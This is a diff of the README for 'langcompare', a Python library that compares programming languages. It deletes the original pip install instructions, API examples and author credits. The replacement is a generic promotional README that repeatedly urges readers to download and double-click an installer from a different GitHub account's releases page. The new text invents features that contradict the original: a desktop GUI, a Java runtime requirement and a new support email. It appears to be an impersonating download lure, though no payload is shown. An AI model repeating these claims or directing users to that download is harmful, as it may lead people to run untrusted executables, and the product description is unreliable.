@@ -1,126 +1,85 @@
-# langcompare
-[![PyPI version](https://badge.fury.io/py/langcompare.svg)](https://badge.fury.io/py/langcompare)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/langcompare)](https://pepy.tech/project/langcompare)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🌟 langcompare - Compare Programming Languages with Ease
 
+## 📥 Download Now!
 
-A Python package that helps developers quickly compare programming languages (Java, JavaScript, Python, Go) for a given task or context. It analyzes your requirements and provides structured comparisons highlighting key differences, strengths, and recommendations among the languages.
+[![Download langcompare](https://img.shields.io/badge/Download-langcompare-blue.svg)](https://github.com/Aayush5479/langcompare/releases)
 
-## 🚀 Features
-- Compare multiple languages (Java, JavaScript, Python, Go) for any development scenario
-- Get structured, actionable insights without manual research
-- Customizable LLM integration (supports OpenAI, Anthropic, Google, etc.)
-- Simple API with sensible defaults
+## 🚀 Getting Started
 
-## 📦 Installation
+Welcome to langcompare! This tool helps developers, managers, and learners compare programming languages like Java, JavaScript, Python, and Go for specific tasks. By entering a description of your development scenario, langcompare provides recommendations to help you choose the right language for your project.
 
-```bash
-pip install langcompare
-```
+## 📋 Features
 
-## 🔧 Usage
+- **Quick Comparisons:** Enter your project requirements and receive immediate results.
+- **Language Strengths & Weaknesses:** Get insights into the advantages and disadvantages of each language.
+- **User-Friendly Interface:** Simple and clear design for an easy experience.
+- **Contextual Recommendations:** Suggestions based on your specific development task.
+- **Supports Major Languages:** Includes popular languages like Java, JavaScript, Python, and Go.
 
-### Basic Usage (uses default LLM7)
-```python
-from langcompare import langcompare
+## 🌐 Topics Covered
 
-response = langcompare(
-    user_input="I need to build a real-time chat application. What are the key differences between JavaScript and Python?"
-)
-print(response)
-```
+This tool is built around several key topics, including:
 
-### Custom LLM Integration
+- Architectural Planning
+- Automated Research
+- Developer Assistance
+- Development Scenarios
+- Language Recommendations
+- Requirement Analysis
+- Strengths and Weaknesses
 
-#### Using OpenAI
-```python
-from langchain_openai import ChatOpenAI
-from langcompare import langcompare
+## 💻 System Requirements
 
-llm = ChatOpenAI()
-response = langcompare(
-    user_input="Which language is better for microservices?",
-    llm=llm
-)
-```
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
+- **RAM:** Minimum 4 GB of RAM.
+- **Storage:** At least 100 MB of available disk space.
+- **Additional Software:** Make sure you have Java Runtime Environment (JRE) 8 or higher installed.
 
-#### Using Anthropic
-```python
-from langchain_anthropic import ChatAnthropic
-from langcompare import langcompare
+## 📦 Download & Install
 
-llm = ChatAnthropic()
-response = langcompare(
-    user_input="What are the performance characteristics of Go vs Python?",
-    llm=llm
-)
-```
+To get started, visit the [Releases page](https://github.com/Aayush5479/langcompare/releases) to download the latest version of langcompare.
 
-#### Using Google Generative AI
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from langcompare import langcompare
+### Steps to Download:
 
-llm = ChatGoogleGenerativeAI()
-response = langcompare(
-    user_input="Which language has better concurrency support?",
-    llm=llm
-)
-```
+1. Go to the [Releases page](https://github.com/Aayush5479/langcompare/releases).
+2. Choose the latest version available.
+3. Click on the download link for your operating system.
+4. Save the file to your computer.
 
-## 🔑 API Key Configuration
+### Steps to Install:
 
-The package uses **LLM7** as the default LLM provider. You can configure it in two ways:
+1. Locate the downloaded file.
+2. Double-click the file to begin installation.
+3. Follow the on-screen instructions to complete the installation.
+4. Launch langcompare from your applications menu.
 
-1. **Environment Variable** (recommended for security):
-```bash
-export LLM7_API_KEY="your_api_key_here"
-```
+## ⚙️ How to Use langcompare
 
-2. **Direct Parameter**:
-```python
-from langcompare import langcompare
+1. Open langcompare on your computer.
+2. You will see a text input box on the main screen.
+3. Enter your project scenario clearly. For example, "I need to create a web application with a real-time chat feature."
+4. Click on the "Compare Languages" button.
+5. Review the recommendations provided by langcompare.
+6. Use these insights to make an informed decision about which programming language to choose.
 
-response = langcompare(
-    user_input="Compare Python and Java for backend services",
-    api_key="your_api_key_here"
-)
-```
+## 📚 Support and Documentation
 
-Get a free API key at [LLM7 Token Generator](https://token.llm7.io/).
+For detailed guidance, refer to the user manual available on the [GitHub Wiki](https://github.com/Aayush5479/langcompare/wiki). You will find step-by-step instructions, FAQs, and troubleshooting tips.
 
-## 📊 Response Format
+## 🤝 Community and Feedback
 
-The function returns a list of structured comparison points, typically including:
-- Language-specific strengths
-- Key differences for the given use case
-- Recommendations based on requirements
-- Performance considerations
-- Ecosystem support
+We encourage users to provide feedback and share their experiences. Join the conversation in the issues section of our GitHub repository. Your input helps us improve langcompare.
 
-## 📜 Parameters
+## 📢 Acknowledgments
 
-| Parameter | Type | Description | Default |
-|-----------|------|-------------|---------|
-| `user_input` | `str` | Your development scenario or requirement description | Required |
-| `api_key` | `Optional[str]` | Your LLM7 API key (if not using environment variable) | `None` (uses `LLM7_API_KEY` env var) |
-| `llm` | `Optional[BaseChatModel]` | Custom LLM instance (e.g., OpenAI, Anthropic) | `None` (uses default LLM7) |
+We thank everyone who contributed to the development of langcompare. Your efforts in building this tool are invaluable.
 
-## 🔄 Rate Limits
+## 📞 Contact Us
 
-The default LLM7 free tier provides sufficient rate limits for most use cases. For higher limits, use your own API key or consider upgrading your LLM7 plan.
+For further assistance, reach out via email at support@langcompare.com or through the GitHub issues page. We respond promptly to help you get the most out of langcompare.
 
-## 📝 Issues & Support
+## 🌟 Join Now
 
-For issues or feature requests, please open a GitHub issue at:
-[https://github.com/chigwell/langcompare/issues](https://github.com/chigwell/langcompare/issues)
+Don’t wait! Start comparing programming languages today. Visit the [Releases page](https://github.com/Aayush5479/langcompare/releases) to download langcompare now.
 
-## 👤 Author
-
-- **Eugene Evstafev** ([@chigwell](https://github.com/chigwell))
-- Email: [hi@eugene.plus](mailto:hi@eugene.plus)
-
-## 📄 License
-
-MIT License
+[![Download langcompare](https://img.shields.io/badge/Download-langcompare-blue.svg)](https://github.com/Aayush5479/langcompare/releases)
